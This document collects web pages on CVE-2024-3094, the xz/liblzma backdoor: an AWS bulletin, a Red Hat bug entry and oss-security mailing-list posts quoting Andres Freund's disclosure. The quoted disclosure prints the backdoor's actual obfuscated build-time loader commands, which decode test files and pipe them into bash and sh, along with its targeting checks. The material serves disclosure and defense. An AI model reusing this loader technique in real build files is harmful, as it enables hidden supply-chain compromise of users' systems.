=== Content from aws.amazon.com_23c435bd_20250111_034005.html ===


 [Skip to main content](#aws-page-content-main)
[Click here to return to Amazon Web Services homepage](https://aws.amazon.com/?nc2=h_lg)

[About AWS](/about-aws/?nc2=h_header)
[Contact Us](/contact-us/?nc2=h_header)
Support
English
My Account
 [Sign In](https://console.aws.amazon.com/console/home?nc2=h_ct&src=header-signin)

 [Create an AWS Account](https://portal.aws.amazon.com/gp/aws/developer/registration/index.html?nc2=h_ct&src=header_signup)

Close
Profile

Your profile helps improve your interactions with select AWS experiences.

 [Login](https://auth.aws.amazon.com/sign-in)

Close
Profile

Your profile helps improve your interactions with select AWS experiences.

 [View profile](https://aws.amazon.com/profile)

 [Log out](https://auth.aws.amazon.com/sign-out)

* [Amazon Q](https://aws.amazon.com/q/?nc2=h_ql_prod_l1_q)
* [Products](/products/?nc2=h_ql_prod)
* [Solutions](/solutions/?nc2=h_ql_sol)
* [Pricing](/pricing/?nc2=h_ql_pr)
* [Documentation](https://aws.amazon.com/documentation-overview/?nc2=h_ql_doc_do)
* [Learn](/getting-started/?nc2=h_ql_le)
* [Partner Network](/partners/?nc2=h_ql_pn)
* [AWS Marketplace](https://aws.amazon.com/marketplace/?nc2=h_ql_mp)
* [Customer Enablement](/customer-enablement/?nc2=h_ql_ce)
* [Events](/events/?nc2=h_ql_ev)
* [Explore More](/contact-us/?nc2=h_ql_exm)

Close

* [عربي](https://aws.amazon.com/ar/?nc1=h_ls)
* [Bahasa Indonesia](https://aws.amazon.com/id/?nc1=h_ls)
* [Deutsch](https://aws.amazon.com/de/?nc1=h_ls)
* [English](https://aws.amazon.com/?nc1=h_ls)
* [Español](https://aws.amazon.com/es/?nc1=h_ls)
* [Français](https://aws.amazon.com/fr/?nc1=h_ls)
* [Italiano](https://aws.amazon.com/it/?nc1=h_ls)
* [Português](https://aws.amazon.com/pt/?nc1=h_ls)

* [Tiếng Việt](https://aws.amazon.com/vi/?nc1=f_ls)
* [Türkçe](https://aws.amazon.com/tr/?nc1=h_ls)
* [Ρусский](https://aws.amazon.com/ru/?nc1=h_ls)
* [ไทย](https://aws.amazon.com/th/?nc1=f_ls)
* [日本語](https://aws.amazon.com/jp/?nc1=h_ls)
* [한국어](https://aws.amazon.com/ko/?nc1=h_ls)
* [中文 (简体)](https://aws.amazon.com/cn/?nc1=h_ls)
* [中文 (繁體)](https://aws.amazon.com/tw/?nc1=h_ls)

Close

* [My Profile](/profile/?nc2=h_m_mc)
* [Sign out of AWS Builder ID](https://auth.aws.amazon.com/sign-out/?nc2=h_m_mc)
* [AWS Management Console](https://console.aws.amazon.com/?nc2=h_m_mc)
* [Account Settings](https://console.aws.amazon.com/billing/home#/account?nc2=h_m_ma)
* [Billing & Cost Management](https://console.aws.amazon.com/billing/home?nc2=h_m_bc)
* [Security Credentials](https://console.aws.amazon.com/iam/home?nc2=h_m_sc#security_credential)
* [AWS Personal Health Dashboard](https://phd.aws.amazon.com/?nc2=h_m_sc)

Close

* [Support Center](https://console.aws.amazon.com/support/home/?nc2=h_ql_cu)
* [Expert Help](https://iq.aws.amazon.com/?utm=mkt.nav)
* [Knowledge Center](https://repost.aws/knowledge-center/?nc2=h_m_ma)
* [AWS Support Overview](/premiumsupport/?nc2=h_m_bc)
* [AWS re:Post](https://repost.aws/)

[Click here to return to Amazon Web Services homepage](https://aws.amazon.com/?nc2=h_lg)

Close
Profile

Your profile helps improve your interactions with select AWS experiences.

 [Login](https://auth.aws.amazon.com/sign-in)

Close
Profile

Your profile helps improve your interactions with select AWS experiences.

 [View profile](https://aws.amazon.com/profile)

 [Log out](https://auth.aws.amazon.com/sign-out)

Close
Profile

Your profile helps improve your interactions with select AWS experiences.

 [View profile](https://aws.amazon.com/profile)

 [Log out](https://auth.aws.amazon.com/sign-out)

 [Get Started for Free](https://portal.aws.amazon.com/gp/aws/developer/registration/index.html?nc2=h_mobile)

 [Contact Us](https://aws.amazon.com/contact-us/?nc2=h_mobile)

* [Products](/products/?nc2=h_mo)
* [Solutions](/solutions/?nc2=h_mo)
* [Pricing](/pricing/?nc2=h_mo)
* [Introduction to AWS](/what-is-aws/?nc2=h_mo)
* [Getting Started](/getting-started/?nc2=h_mo)
* [Documentation](https://aws.amazon.com/documentation-overview/?nc2=h_mo)
* [Training and Certification](/training/?nc2=h_mo)
* [Developer Center](/developer/?nc2=h_mo)
* [Customer Success](/solutions/case-studies/?nc2=h_mo)
* [Partner Network](/partners/?nc2=h_mo)
* [AWS Marketplace](https://aws.amazon.com/marketplace/?nc2=h_mo)
* [Support](https://console.aws.amazon.com/support/home?nc2=h_ql_cu)
* [AWS re:Post](https://repost.aws/)
* [Log into Console](https://console.aws.amazon.com/console/home)
* [Download the Mobile App](/console/mobile/)

# CVE-2024-3094

**Publication Date: 2024/03/29 12:30 PM PST
 CVE Identifier: CVE-2024-3094**

AWS is aware of CVE-2024-3094, which affects versions 5.6.0 and 5.6.1 of the xz-utils package. This issue may attempt to introduce security issues in openssh through the use of liblzma within some operating system environments. Amazon Linux customers are not affected by this issue, and no action is required. AWS infrastructure and services do not utilize the affected software and are not impacted. Users of Bottlerocket are not affected.

Customers using other operating systems are advised to refer to information provided by the OS vendor to address any concerns originating from this reported issue.

Security-related questions or concerns can be brought to our attention via aws-security@amazon.com.

 [Sign In to the Console](https://console.aws.amazon.com/console/home?nc1=f_ct&src=footer-signin-mobile)
### Learn About AWS

* [What Is AWS?](/what-is-aws/?nc1=f_cc)
* [What Is Cloud Computing?](/what-is-cloud-computing/?nc1=f_cc)
* [AWS Accessibility](/accessibility/?nc1=f_cc)
* [AWS Inclusion, Diversity & Equity](/diversity-inclusion/?nc1=f_cc)
* [What Is DevOps?](/devops/what-is-devops/?nc1=f_cc)
* [What Is a Container?](/containers/?nc1=f_cc)
* [What Is a Data Lake?](/what-is/data-lake/?nc1=f_cc)
* [What is Artificial Intelligence (AI)?](/what-is/artificial-intelligence/?nc1=f_cc)
* [What is Generative AI?](/what-is/generative-ai/?nc1=f_cc)
* [What is Machine Learning (ML)?](/what-is/machine-learning/?nc1=f_cc)
* [AWS Cloud Security](/security/?nc1=f_cc)
* [What's New](/new/?nc1=f_cc)
* [Blogs](/blogs/?nc1=f_cc)
* [Press Releases](https://press.aboutamazon.com/press-releases/aws "Press Releases")

### Resources for AWS

* [Getting Started](/getting-started/?nc1=f_cc)
* [Training and Certification](/training/?nc1=f_cc)
* [AWS Solutions Library](/solutions/?nc1=f_cc)
* [Architecture Center](/architecture/?nc1=f_cc)
* [Product and Technical FAQs](/faqs/?nc1=f_dr)
* [Analyst Reports](/resources/analyst-reports/?nc1=f_cc)
* [AWS Partners](/partners/work-with-partners/?nc1=f_dr)

### Developers on AWS

* [Developer Center](/developer/?nc1=f_dr)
* [SDKs & Tools](/developer/tools/?nc1=f_dr)
* [.NET on AWS](/developer/language/net/?nc1=f_dr)
* [Python on AWS](/developer/language/python/?nc1=f_dr)
* [Java on AWS](/developer/language/java/?nc1=f_dr)
* [PHP on AWS](/developer/language/php/?nc1=f_cc)
* [JavaScript on AWS](/developer/language/javascript/?nc1=f_dr)

### Help

* [Contact Us](/contact-us/?nc1=f_m)
* [Get Expert Help](https://iq.aws.amazon.com/?utm=mkt.foot/?nc1=f_m)
* [File a Support Ticket](https://console.aws.amazon.com/support/home/?nc1=f_dr)
* [AWS re:Post](https://repost.aws/?nc1=f_dr)
* [Knowledge Center](https://repost.aws/knowledge-center/?nc1=f_dr)
* [AWS Support Overview](/premiumsupport/?nc1=f_dr)
* [Legal](/legal/?nc1=f_cc)
* [AWS Careers](/careers/)

 [Create an AWS Account](https://portal.aws.amazon.com/gp/aws/developer/registration/index.html?nc1=f_ct&src=default)

Amazon is an Equal Opportunity Employer:
 *Minority / Women / Disability / Veteran / Gender Identity / Sexual Orientation / Age.*

* Language
* [عربي](https://aws.amazon.com/ar/?nc1=h_ls)
* [Bahasa Indonesia](https://aws.amazon.com/id/?nc1=h_ls)
* [Deutsch](https://aws.amazon.com/de/?nc1=h_ls)
* [English](https://aws.amazon.com/?nc1=h_ls)
* [Español](https://aws.amazon.com/es/?nc1=h_ls)
* [Français](https://aws.amazon.com/fr/?nc1=h_ls)
* [Italiano](https://aws.amazon.com/it/?nc1=h_ls)
* [Português](https://aws.amazon.com/pt/?nc1=h_ls)
* [Tiếng Việt](https://aws.amazon.com/vi/?nc1=f_ls)
* [Türkçe](https://aws.amazon.com/tr/?nc1=h_ls)
* [Ρусский](https://aws.amazon.com/ru/?nc1=h_ls)
* [ไทย](https://aws.amazon.com/th/?nc1=f_ls)
* [日本語](https://aws.amazon.com/jp/?nc1=h_ls)
* [한국어](https://aws.amazon.com/ko/?nc1=h_ls)
* [中文 (简体)](https://aws.amazon.com/cn/?nc1=h_ls)
* [中文 (繁體)](https://aws.amazon.com/tw/?nc1=h_ls)

* [Privacy](https://aws.amazon.com/privacy/?nc1=f_pr)
* |
* [Accessibility](https://aws.amazon.com/accessibility/?nc1=f_acc)
* |
* [Site Terms](https://aws.amazon.com/terms/?nc1=f_pr)
* |
* Cookie Preferences
* |
* © 2024, Amazon Web Services, Inc. or its affiliates. All rights reserved.

#### Ending Support for Internet Explorer

Got it

AWS support for Internet Explorer ends on 07/31/2022. Supported browsers are Chrome, Firefox, Edge, and Safari.
[Learn more »](https://aws.amazon.com/blogs/aws/heads-up-aws-support-for-internet-explorer-11-is-ending/)

Got it



=== Content from www.openwall.com_fd36a92f_20250111_034001.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](11) [[next>]](13) [[<thread-prev]](11) [[thread-next>]](13) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <ZgcL9VUx6CQ5Wx/W@weckbecker.name>
Date: Fri, 29 Mar 2024 19:44:05 +0100
From: Matthias Weckbecker <matthias@...kbecker.name>
To: oss-security@...ts.openwall.com
Subject: Re: backdoor in upstream xz/liblzma leading to ssh
 server compromise

Hi Andres,

thanks for the nice write-up.

I've attached a yara rule to detect the *.o droplet you attached in the
email (liblzma_la-crc64-fast.o.gz).

I'll look more into this as soon as I return from holidays. Again, nice
write-up. Thanks!

Matthias

View attachment "[CVE-2024-3094-o.yara](12/1)" of type "text/plain" (613 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from bugzilla.redhat.com_0afbe218_20250111_034011.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D2272210)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D2272210)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D2272210)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 2272210

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 2272210**](show_bug.cgi?id=2272210)
(CVE-2024-3094)
- [CVE-2024-3094](https://access.redhat.com/security/cve/CVE-2024-3094) xz: malicious code in distributed source

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2024-3094 xz: malicious code in distributed source

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | NEW | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2024-3094 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | urgent | | [Severity:](page.cgi?id=fields.html#bug_severity) | urgent | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [2272206](show_bug.cgi?id=2272206) | | TreeView+ | [depends on](buglist.cgi?bug_id=2272210&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=2272210&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2024-03-29 15:56 UTC by Zack Miele | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2024-04-17 06:56 UTC ([History](show_activity.cgi?id=2272210)) | | [CC List:](page.cgi?id=fields.html#cclist) | 51 users (show)  adudiak asoldano bbaranow bdettelb bdm bmaxwell brian.stansberry caswilli cdewolf chazlett darran.lofthouse dfreiber dkreling dosoudil drow fjansen fjuma gabravier germano.massullo hkataria ivassile iweiss jburrell jmitchel jsherril jtanner kaycoth klaas kshier lgao luizcosta luke mosmerov msochure mstefank msvehla nwallace nweather oezr piotr.zygielo pjindal pmackay rstancel security-response-team sidakwo smaestri stcannon thomas tom.jenkinson vkumar yguenane | | Fixed In Version: |  | | | Doc Type: | If docs needed, set a value | | | Doc Text: | Malicious code was discovered in the upstream tarballs of xz, starting with version 5.6.0. Through a series of complex obfuscations, the liblzma build process extracts a prebuilt object file from a disguised test file existing in the source code, which is then used to modify specific functions in the liblzma code. This results in a modified liblzma library that can be used by any software linked against this library, intercepting and modifying the data interaction with this library. | | | Clone Of: |  | | | Environment: |  | | | Last Closed: |  | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=2272210#c0)  Zack Miele    2024-03-29 15:56:47 UTC  ``` Malicious code discovered in the tarballs distributed from upstream sources beginning in 5.6.0.   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=2272210&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from www.openwall.com_8e30dd38_20250111_034002.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[<thread-prev]](4) [[thread-next>]](6) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CAN_LGv3GAmdpaXVCjwp1UAH_Z6KKDnqydj68Oj4jmXRwwPE=Uw@mail.gmail.com>
Date: Sat, 30 Mar 2024 19:00:42 +0800
From: "Alexander E. Patrakov" <patrakov@...il.com>
To: oss-security@...ts.openwall.com
Subject: Re: backdoor in upstream xz/liblzma leading to ssh
 server compromise

As GitHub has disabled the repository, the commit links in the
original message no longer work. One of the remaining mirrors is
<https://git.rootprojects.org/root/xz>

So, here are the links, resubmitted and accompanied by the original
text from Andres Freund's initial email to this thread.

===
The files containing the bulk of the exploit are in an obfuscated form
in tests/files/bad-3-corrupt_lzma2.xz
tests/files/good-large_compressed.lzma committed upstream. They were
initially added in

<https://git.rootprojects.org/root/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0>

Note that the files were not even used for any "tests" in 5.6.0.

Subsequently the injected code (more about that below) caused valgrind errors
and crashes in some configurations, due the stack layout differing from what
the backdoor was expecting.  These issues were attempted to be worked around
in 5.6.1:

<https://git.rootprojects.org/root/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad>
<https://git.rootprojects.org/root/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f>
<https://git.rootprojects.org/root/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92>

For which the exploit code was then adjusted:

<https://git.rootprojects.org/root/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89>
===

Arch Linux builds their xz from commit
git+<https://github.com/tukaani-project/xz#tag=v5.6.1> which is now an
invalid link. They use some shaXXXsums to verify the integrity of the
commit they are building from, but I don't know how this works, i.e.,
how to check this manually:

source=("git+<https://github.com/tukaani-project/xz#tag=v$>{pkgver}")
sha256sums=('e10fa4254d5ff033c78dcbfd2866e79a762b8a719503a7c146758e590de945dc')
sha512sums=('8f4ee2e5c9b46d0917d8bdf8b172a70d02a6cf2d4d78a2e99ae942e32979b72b407809ffda2885af41e2c9d801c19eab5e4fd73888fbaf042346be957df406fc')

The mirror does have a v5.6.1 tag, and the build passes (and validates
the checksums) if I replace the source with:

source=("git+<https://git.rootprojects.org/root/xz#tag=v$>{pkgver}")

On Sat, Mar 30, 2024 at 12:09 AM Andres Freund <andres@...razel.de> wrote:
>
> Hi,
>
> After observing a few odd symptoms around liblzma (part of the xz package) on
> Debian sid installations over the last weeks (logins with ssh taking a lot of
> CPU, valgrind errors) I figured out the answer:
>
> The upstream xz repository and the xz tarballs have been backdoored.
>
> At first I thought this was a compromise of debian's package, but it turns out
> to be upstream.
>
>
> == Compromised Release Tarball ==
>
> One portion of the backdoor is *solely in the distributed tarballs*. For
> easier reference, here's a link to debian's import of the tarball, but it is
> also present in the tarballs for 5.6.0 and 5.6.1:
>
> <https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63>
>
> That line is *not* in the upstream source of build-to-host, nor is
> build-to-host used by xz in git.  However, it is present in the tarballs
> released upstream, except for the "source code" links, which I think github
> generates directly from the repository contents:
>
> <https://github.com/tukaani-project/xz/releases/tag/v5.6.0>
> <https://github.com/tukaani-project/xz/releases/tag/v5.6.1>
>
>
> This injects an obfuscated script to be executed at the end of configure. This
> script is fairly obfuscated and data from "test" .xz files in the repository.
>
>
> This script is executed and, if some preconditions match, modifies
> $builddir/src/liblzma/Makefile to contain
>
> am__test = bad-3-corrupt_lzma2.xz
> ...
> am__test_dir=$(top_srcdir)/tests/files/$(am__test)
> ...
> sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
>
>
> which ends up as
> ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "        \-_" "         _\-" | xz -d | /bin/bash >/dev/null 2>&1; ...
>
> Leaving out the "| bash" that produces
>
> ####Hello####
> #��Z�.hj�
> eval `grep ^srcdir= config.status`
> if test -f ../../config.status;then
> eval `grep ^srcdir= ../../config.status`
> srcdir="../../$srcdir"
> fi
> export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
> ####World####
>
> After de-obfuscation this leads to the attached injected.txt.
>
>
> == Compromised Repository ==
>
> The files containing the bulk of the exploit are in an obfuscated form in
>   tests/files/bad-3-corrupt_lzma2.xz
>   tests/files/good-large_compressed.lzma
> committed upstream. They were initially added in
> <https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0>
>
> Note that the files were not even used for any "tests" in 5.6.0.
>
>
> Subsequently the injected code (more about that below) caused valgrind errors
> and crashes in some configurations, due the stack layout differing from what
> the backdoor was expecting.  These issues were attempted to be worked around
> in 5.6.1:
>
> <https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad>
> <https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f>
> <https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92>
>
> For which the exploit code was then adjusted:
> <https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89>
>
> Given the activity over several weeks, the committer is either directly
> involved or there was some quite severe compromise of their
> system. Unfortunately the latter looks like the less likely explanation, given
> they communicated on various lists about the "fixes" mentioned above.
>
>
> Florian Weimer first extracted the injected code in isolation, also attached,
> liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!
>
>
> == Affected Systems ==
>
> The attached de-obfuscated script is invoked first after configure, where it
> decides whether to modify the build process to inject the code.
>
> These conditions include targeting only x86-64 linux:
>     if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
>
> Building with gcc and the gnu linker
>     if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
>     exit 0
>     fi
>     if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
>     exit 0
>     fi
>     LDv=$LD" -v"
>     if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
>     exit 0
>
> Running as part of a debian or RPM package build:
>     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
>
> Particularly the latter is likely aimed at making it harder to reproduce the
> issue for investigators.
>
>
> Due to the working of the injected code (see below), it is likely the backdoor
> can only work on glibc based systems.
>
>
> Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
> distributions, and where they have, mostly in pre-release versions.
>
>
> == Observing Impact on openssh server ==
>
> With the backdoored liblzma installed, logins via ssh become a lot slower.
>
> time ssh nonexistant@...alhost
>
> before:
> nonexistant@...alhost: Permission denied (publickey).
>
> before:
> real    0m0.299s
> user    0m0.202s
> sys     0m0.006s
>
> after:
> nonexistant@...alhost: Permission denied (publickey).
>
> real    0m0.807s
> user    0m0.202s
> sys     0m0.006s
>
>
> openssh does not directly use liblzma. However debian and several other
> distributions patch openssh to support systemd notification, and libsystemd
> does depend on lzma.
>
>
> Initially starting sshd outside of systemd did not show the slowdown, despite
> the backdoor briefly getting invoked. This appears to be part of some
> countermeasures to make analysis harder.
>
> Observed requirements for the exploit:
> a) TERM environment variable is not set
> b) argv[0] needs to be /usr/sbin/sshd
> c) LD_DEBUG, LD_PROFILE are not set
> d) LANG needs to be set
> e) Some debugging environments, like rr, appear to be detected. Plain gdb
>    appears to be detected in some situations, but not others
>
> To reproduce outside of systemd, the server can be started with a clear
> environment, setting only the required variable:
>
> env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D
>
>
> In fact, openssh does not need to be started as a server to observe the
> slowdown:
>
> slow:
> env -i LANG=C /usr/sbin/sshd -h
>
